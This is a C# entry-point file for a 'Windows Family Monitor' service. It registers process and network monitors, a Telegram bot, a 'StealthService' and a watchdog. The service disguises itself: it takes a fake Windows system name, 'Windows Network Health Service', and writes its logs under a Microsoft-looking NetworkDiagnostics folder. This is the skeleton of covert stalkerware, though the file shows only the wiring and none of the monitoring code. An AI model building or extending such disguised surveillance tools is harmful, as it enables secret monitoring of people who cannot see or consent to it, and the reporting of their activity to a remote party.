using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Hosting;
using Microsoft.Extensions.Logging;
using Serilog;
using WinFamilyMonitor.Bot;
using WinFamilyMonitor.Data;
using WinFamilyMonitor.Models;
using WinFamilyMonitor.Monitoring;
using WinFamilyMonitor.Security;
using WinFamilyMonitor.Services;

namespace WinFamilyMonitor;

/// <summary>
/// Main entry point for Windows Family Monitor Service
/// Service Name: WindowsNetworkHealthService
/// Display Name: Windows Network Health Service
/// </summary>
public class Program
{
    public static async Task Main(string[] args)
    {
        // Configure Serilog
        var logPath = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
            "Microsoft", "NetworkDiagnostics", "Logs", "service.log");

        Directory.CreateDirectory(Path.GetDirectoryName(logPath)!);

        Log.Logger = new LoggerConfiguration()
            .MinimumLevel.Information()
            .WriteTo.File(
                logPath,
                rollingInterval: RollingInterval.Day,
                retainedFileCountLimit: 7,
                outputTemplate: "{Timestamp:yyyy-MM-dd HH:mm:ss} [{Level:u3}] {Message:lj}{NewLine}{Exception}")
            .CreateLogger();

        try
        {
            Log.Information("Starting Windows Family Monitor Service");
            await CreateHostBuilder(args).Build().RunAsync();
        }
        catch (Exception ex)
        {
            Log.Fatal(ex, "Service terminated unexpectedly");
        }
        finally
        {
            Log.CloseAndFlush();
        }
    }

    private static IHostBuilder CreateHostBuilder(string[] args) =>
        Host.CreateDefaultBuilder(args)
            .UseWindowsService(options =>
            {
                options.ServiceName = "WindowsNetworkHealthService";
            })
            .UseSerilog()
            .ConfigureServices((hostContext, services) =>
            {
                // Configuration
                services.Configure<AppConfig>(hostContext.Configuration);

                // Core Services
                services.AddSingleton<IDataService, Database>();
                services.AddSingleton<ReportGenerator>();

                // Initialize database on startup
                services.AddHostedService<DatabaseInitializer>();

                // Monitoring Services
                services.AddHostedService<ProcessMonitor>();
                services.AddHostedService<NetworkMonitor>();

                // Telegram Bot
                services.AddHostedService<TelegramBotService>();

                // Security Services
                services.AddHostedService<StealthService>();
                services.AddHostedService<WatchdogService>();
            });
}

/// <summary>
/// Initializes the database on service startup
/// </summary>
public class DatabaseInitializer : IHostedService
{
    private readonly IDataService _dataService;
    private readonly ILogger<DatabaseInitializer> _logger;

    public DatabaseInitializer(IDataService dataService, ILogger<DatabaseInitializer> logger)
    {
        _dataService = dataService;
        _logger = logger;
    }

    public async Task StartAsync(CancellationToken cancellationToken)
    {
        try
        {
            _logger.LogInformation("Initializing database...");
            await _dataService.InitializeAsync();
            _logger.LogInformation("Database initialized successfully");
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "Failed to initialize database");
            throw;
        }
    }

    public Task StopAsync(CancellationToken cancellationToken) => Task.CompletedTask;
}
